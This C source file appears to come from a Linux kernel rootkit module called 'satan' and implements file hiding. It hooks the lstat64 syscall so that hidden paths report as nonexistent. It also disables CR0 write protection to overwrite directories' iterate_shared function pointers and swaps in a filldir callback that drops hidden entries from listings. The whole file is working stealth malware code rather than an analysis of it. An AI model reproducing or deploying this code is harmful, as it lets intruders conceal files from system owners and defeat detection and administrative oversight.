// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "file.h"

#include <linux/fs.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "syscall.h"
#include "util.h"

#define BASENAME_BUF_SIZE 128
#define FILENAME_BUF_SIZE 128
static char basename_buf[BASENAME_BUF_SIZE] = {0};
static char filename_buf[BASENAME_BUF_SIZE] = {0};
static char *basename = NULL;


struct hidden_file {
        char *fullpath;
        char *basename;  // i.e., dirname
        char *filename;
        struct list_head list;
};
static LIST_HEAD(hidden_files_list);


struct dir_iterate_shared {
        char *basename;
        int (*real_iterate_shared)(struct file *, struct dir_context *);
        struct list_head list;
};
static LIST_HEAD(real_iterate_shared_list);


static int ret = 0;
static struct file *filp = NULL;
static struct file_operations *f_op = NULL;

static int (*real_iterate_shared)(struct file *, struct dir_context *);
static filldir_t real_filldir;


static int satan_iterate_shared(struct file *filp, struct dir_context *ctx);
static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type);

asmlinkage int (*real_lstat64)(const char __user *filename,
                               struct stat64 __user *statbuf);

asmlinkage long satan_lstat64(const char __user *filename,
                              struct stat64 __user *statbuf)
{
        struct hidden_file *f = NULL;
        struct list_head *p = NULL;

        strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
       
        list_for_each(p, &hidden_files_list) {
                f = list_entry(p, struct hidden_file, list);

                if (!strncmp(filename_buf, f->fullpath, strlen(f->fullpath))) {
                        return -ENOENT;
                }
        }

        real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat64);
        return real_lstat64(filename, statbuf);
}




static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f);
static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f);

static struct hidden_file *hidden_files_list_add(const char *path)
{
        struct hidden_file *f = (struct hidden_file*) kmalloc(sizeof(struct hidden_file), GFP_KERNEL);

        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        memset(filename_buf, 0, FILENAME_BUF_SIZE);

        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);

        f->fullpath = kzalloc(strlen(path) + 1, GFP_KERNEL);
        f->basename = kzalloc(strlen(basename_buf) + 1, GFP_KERNEL);
        f->filename = kzalloc(strlen(filename_buf) + 1, GFP_KERNEL);

        strcpy(f->fullpath, path);
        strcpy(f->basename, basename_buf);
        strcpy(f->filename, filename_buf);

        pr_info("satan: file: adding (%s,%s) to list of hidden files.\n", f->basename, f->filename);
        list_add_tail(&(f->list), &hidden_files_list);
        return f;
}

static int hidden_files_list_del(const char *path)
{
        struct hidden_file *f = NULL;
        struct list_head *p = NULL;
        struct list_head *tmp = NULL;

        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        memset(filename_buf, 0, FILENAME_BUF_SIZE);

        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);

        list_for_each_safe(p, tmp, &hidden_files_list) {
                f = list_entry(p, struct hidden_file, list);

                if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                        pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                        list_del(p);
                        kfree(f->fullpath);
                        kfree(f->basename);
                        kfree(f->filename);
                        kfree(f);
                        return 0;
                }
        }
        
        return 1;
}

static struct hidden_file *hidden_files_list_get(const char *path)
{
        struct hidden_file *f = NULL;
        struct list_head *p = NULL;

        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        memset(filename_buf, 0, FILENAME_BUF_SIZE);

        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);

        list_for_each(p, &hidden_files_list) {
                f = list_entry(p, struct hidden_file, list);

                if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                        return f;
                }
        }

        return NULL;
}


static unsigned long *real_iterate_shared_list_get(const char *basename)
{
        struct dir_iterate_shared *dir_is = NULL;
        struct list_head *p = NULL;

        list_for_each(p, &real_iterate_shared_list) {
                dir_is = list_entry(p, struct dir_iterate_shared, list);

                if (!strncmp(basename, dir_is->basename, strlen(dir_is->basename))) {
                        return (unsigned long *) (dir_is->real_iterate_shared);
                }
        }

        return NULL;
}

static void real_iterate_shared_list_add(const char *basename, void *iterate_shared)
{
        struct dir_iterate_shared *dir_is = NULL;

        // Don't re-add if it already exists.
        if (real_iterate_shared_list_get(basename))
                return;


        dir_is = (struct dir_iterate_shared *) kmalloc(sizeof(struct dir_iterate_shared), GFP_KERNEL);
        dir_is->basename = kzalloc(strlen(basename) + 1, GFP_KERNEL);
        dir_is->real_iterate_shared = iterate_shared;
        strcpy(dir_is->basename, basename);

        list_add_tail(&(dir_is->list), &real_iterate_shared_list);
}

static void real_iterate_shared_list_clear(void)
{
        struct dir_iterate_shared *dir_is = NULL;
        struct list_head *p = NULL;
        struct list_head *tmp = NULL;

        list_for_each_safe(p, tmp, &real_iterate_shared_list) {
                dir_is = list_entry(p, struct dir_iterate_shared, list);

                list_del(p);
                kfree(dir_is->basename);
                kfree(dir_is);
        }
}


int satan_file_init(void)
{
        return satan_syscall_hook(__NR_lstat64, satan_lstat64);
}

int satan_file_exit(void)
{
        struct hidden_file *f = NULL;
        struct list_head *p = NULL;
        struct list_head *tmp = NULL;

        list_for_each_safe(p, tmp, &hidden_files_list) {
                f = list_entry(p, struct hidden_file, list);
                satan_file_unhook_parent_dir_iterate_shared(f);

                pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                list_del(p);
                kfree(f->fullpath);
                kfree(f->basename);
                kfree(f->filename);
                kfree(f);
        }

        satan_syscall_unhook(__NR_lstat64);
        real_iterate_shared_list_clear();
        return 0;  // TODO: refactor this shit
}

int satan_file_hide(const char *path)
{
        struct hidden_file *f = hidden_files_list_add(path);
        return satan_file_hook_parent_dir_iterate_shared(f);
}

int satan_file_unhide(const char *path)
{
        struct hidden_file *f = hidden_files_list_get(path);

        if (!f) {
                pr_alert("satan: file: failed to unhide %s\n", path);
                return 1;
        }

        if (satan_file_unhook_parent_dir_iterate_shared(f) != 0) {
                return 1;
        }

        if (hidden_files_list_del(path) != 0) {
                return 1;
        }

        return 0;
}


static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f)
{ 
        filp = filp_open(f->basename, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                pr_alert("satan: failed to open %s\n", f->basename);
                return 1;
        } else {
                f_op = (struct file_operations *) filp->f_op;

                // If we haven't memorized the real iterate_shared() of this directory,
                // add it to the list.
                if (!real_iterate_shared_list_get(f->basename))
                        real_iterate_shared_list_add(f->basename, f_op->iterate_shared);


                CR0_WP_DISABLE {
                        pr_info("satan: iterate_shared: %p\n", f_op->iterate_shared);
                        pr_alert("satan: hijacking iterate from %p to %p.\n",
                                 f_op->iterate_shared, satan_iterate_shared);
                        f_op->iterate_shared = satan_iterate_shared;
                } CR0_WP_DISABLE_END
                return 0;
        }
}

static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f)
{
        filp = filp_open(f->basename, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                pr_alert("satan: failed to open %s:\n", f->basename);
                return 1;
        } else {
                f_op = (struct file_operations *) filp->f_op;

                // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
                real_iterate_shared = (void *) real_iterate_shared_list_get(f->basename);


                CR0_WP_DISABLE {
                        pr_info("satan: restoring iterate_shared from %p to %p\n",
                                f_op->iterate_shared, real_iterate_shared);
                        f_op->iterate_shared = real_iterate_shared;
                } CR0_WP_DISABLE_END
                return 0;
        }
}


static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
{
        // Get the absolute path of `filp` via `d_path()`.
        // I've tried `dentry_path_raw()` but it always returns a wrong path :(
        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        basename = d_path(&filp->f_path, basename_buf, BASENAME_BUF_SIZE);
        pr_info("satan: basename %s\n", basename);

        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
        real_iterate_shared = (void *) real_iterate_shared_list_get(basename);


        real_filldir = ctx->actor;

        // ->iterate_shared() will call ctx->actor, i.e., filldir()
        // Here we'll replace the original filldir() with our version of filldir().
        *(filldir_t *)&ctx->actor = satan_filldir;
        ret = real_iterate_shared(filp, ctx);
        *(filldir_t *)&ctx->actor = real_filldir;

        return ret;
}

static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type)
{
        struct hidden_file *f = NULL;
        struct list_head *p = NULL;

        list_for_each(p, &hidden_files_list) {
                f = list_entry(p, struct hidden_file, list);

                // At this point:
                // 1. Current basename is stored in `basename`.
                // 2. Current filename is stored in `name`.
                pr_info("satan: comparing: (%s,%s) and (%s,%s)\n",
                        f->basename, basename, f->filename, name);

                if (!strcmp(f->basename, basename) && !strcmp(f->filename, name)) {
                        pr_info("satan: hiding: %s", name);
                        return 0;
                }
        }

        // Let the original filldir() finish its job.
        return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
